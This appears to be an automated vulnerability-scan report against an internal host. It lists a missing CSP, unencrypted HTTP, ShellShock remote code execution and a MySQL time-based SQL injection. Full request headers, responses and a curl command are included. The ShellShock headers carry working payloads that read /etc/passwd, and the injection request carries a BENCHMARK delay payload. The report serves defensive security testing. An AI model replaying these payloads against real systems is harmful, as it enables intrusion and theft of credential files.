findings.title: Content Security Policy Configuration
findings.description: CSP is not set for URL: http://10.48.135.59/cgi-bin

findings.title: Unencrypted Channels
findings.description: No HTTPS redirection for this host. All HTTP requests are served in clear text.

findings.title: ShellShock - Remote Code Execution
findings.description: GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka ShellShock.
findings.impact: Remote code execution can lead to unauthorized access, data theft, and system compromise.
findings.request:
GET /cgi-bin/test.cgi HTTP/1.1
Host: 10.48.135.59
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
findings.response:
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html
Date: Thu, 28 May 2026 12:31:51 GMT
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding

findings.title: Time-based SQL Injection (BENCHMARK Function)
findings.description:
Detects Time-based SQL Injection using MySQL BENCHMARK function.
Useful when SLEEP function is filtered but BENCHMARK is allowed.
BENCHMARK(count, expr) executes the expression count times, causing measurable delay.
findings.request:
GET /?uid=1'+OR+IF(1=1,BENCHMARK(10000000,MD5(1)),0)--+ HTTP/1.1
Host: 10.48.135.59
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.20
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
findings.response:
HTTP/1.1 200 OK Connection: close Accept-Ranges: bytes Content-Type: text/html Date: Thu, 28 May 2026 12:28:43 GMT Etag: "bd1-5ae57bb9a1192-gzip" Last-Modified: Wed, 02 Sep 2020 17:11:56 GMT Server: Apache/2.4.7 (Ubuntu) Vary: Accept-Encoding 0day

0day

Ryan Montgomery

Internet Marketer / Dev / Entrepreneur
findings.curlCommand: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.20' 'http://10.48.135.59/?uid=1'\''+OR+IF(1=1,BENCHMARK(10000000,MD5(1)),0)--+'
